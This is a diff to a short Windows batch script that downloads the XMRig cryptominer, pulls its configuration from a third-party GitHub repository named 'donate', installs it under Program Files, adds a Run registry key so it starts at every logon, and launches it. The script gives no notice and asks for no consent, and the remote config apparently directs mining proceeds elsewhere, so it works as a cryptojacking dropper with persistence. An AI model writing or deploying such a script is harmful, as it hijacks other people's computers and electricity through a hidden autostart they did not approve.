@@ -1,11 +1,9 @@
 curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-gcc-win64.zip
 tar -xf xmrig-6.16.2-gcc-win64.zip
 curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
-del xmrig-6.16.2\config.json
-move config.json xmrig-6.16.2
-del xmrig-6.16.2-gcc-win64.zip
-del xmrig.bat.bak
-del xmrig.bat
-move xmrig-6.16.2 "C:\Program Files"
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "xmrig" /t REG_SZ /F /D "C:\Program Files\xmrig-6.16.2\xmrig.exe"
-start "C:\Program Files\xmrig-6.16.2\xmrig.exe"
+mkdir xmrig
+move xmrig-6.16.2\xmrig.exe xmrig
+move config.json xmrig
+move xmrig "C:\Program Files"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "xmrig" /t REG_SZ /F /D "C:\Program Files\xmrig\xmrig.exe"
+start "C:\Program Files\xmrig\xmrig.exe"
